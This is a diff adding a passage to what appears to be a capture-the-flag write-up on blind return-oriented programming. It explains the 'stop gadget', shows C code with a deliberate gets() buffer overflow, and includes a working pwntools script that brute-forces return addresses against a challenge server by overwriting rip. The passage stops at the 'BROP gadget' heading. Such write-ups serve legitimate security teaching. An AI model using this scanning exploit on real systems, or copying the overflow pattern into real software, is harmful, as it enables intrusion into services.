@@ -137,3 +137,97 @@ A more visual example could be:
 Thus if we are able to chain gadgets, creating a *ROP chain*, we have a very powerful exploit defeating both ASLR (*Address Space Layout Randomization*) which prevents the attacker to know where to jump in the *libc*, and NX (*No eXecutable*) which prevents shellcode execution on the stack.
 
 Alright alright, this whole ROP stuff is great. But how do we get our gadgets without having access to the binaryy? In a classic ROP challenge we can just disassemble the file to find the interesting ones and the address to return on. How is this possible remotely? This is where things get interesting...
+
+### The stop gadget
+
+The first gadget we need is called the *stop gadget*. This gadget is the most important one because it will be the one that confirms us we regained the execution flow control during the attack. It must either return a different string than the expected one or make the program hang up in order to know when we hit this gadget.
+
+Back to our case, we can expect that there is an address in the binary that prints out
+
+```
+Hello you.
+What is your name ?
+>>>
+```
+
+and waits for a user input. But we must be careful, let's try to imagine what the code looks like.
+
+```c
+char username[32];
+puts("Hello you.\nWhat is your name ?\n>>> ");
+gets(username); // <- overflow
+printf("Thanks %s\nBye!\n", username);
+```
+
+If we return on the `puts` line, no problem, we will get the expected string for our stop gadget. But what if the code is a bit different?
+
+```c
+int useless;
+char username[32];
+useless = 667; // useless line, we can imagine something else like a call to a vulnerable function too
+puts("Hello you.\nWhat is your name ?\n>>> ");
+gets(username); // <- overflow
+printf("Thanks %s\nBye!\n", username);
+```
+
+Here returning on the `useless` initialization and the `puts` lines BOTH return a valid output for out stop gadget! Thus when we will be searching for other gadgets, expecting the program to return our `Hello you...` sequence ONLY when it hits the stop gadget, there will be false positives corresponding to other addresses yelling the same sequence, as the `useless` initialization line.
+
+So, you must be wondering, how do we deal with it? The solution is actually really simple: instead of stopping when we find a valid address returning our *reference* (i.e. the sequence we associated with the stop gadget), we generate a list of false positives so we can avoid them later and keep only one, the first one for instance, to make it our stop gadget.
+
+And because I feel like I am over-complicating things, let's see how it really works:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+ref = b'Hello you.\nWhat is your name ?\n>>> '
+base_addr = 0x400000
+L = [] # where we stock out false positives
+
+# custom range to save some time but we first scanned from 0x400000 to 0x410000
+start = 0x500
+end = start + 0x300
+
+for i in range(start, end):
+    # connect to server without logging it
+    context.log_level='error'
+    r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
+    context.log_level='info'
+
+    try:
+        # build payload
+        addr = base_addr + i # the address we're returning on
+        log.info(f'trying addr = {hex(addr)}')
+        pld = b'c' * 40 # fill buffer
+        pld += p64(addr) # overwrite `rip`
+
+        # send and get output
+        r.recv(timeout=0.1)
+        r.send(pld)
+        res = r.recv(timeout=0.1)
+
+        # we found a valid address
+        if ref in res:
+            L.append(addr)
+
+    # if nothing to report then just close connection without logging it
+    except:
+        pass
+    context.log_level='error'
+    r.close()
+    context.log_level='info'
+
+stop_gadgets = L
+stop_gadget = stop_gadgets[0]
+log.success(f'stop_gadget = {hex(stop_gadget)}')
+log.success(f'stop_gadgets = {[hex(i) for i in stop_gadgets]}')
+```
+
+![stop](images/stop.png)
+
+Success! We now have a way to know exactly when we successfully control `rip`. So, what's next?
+
+# The BROP gadget
+
+
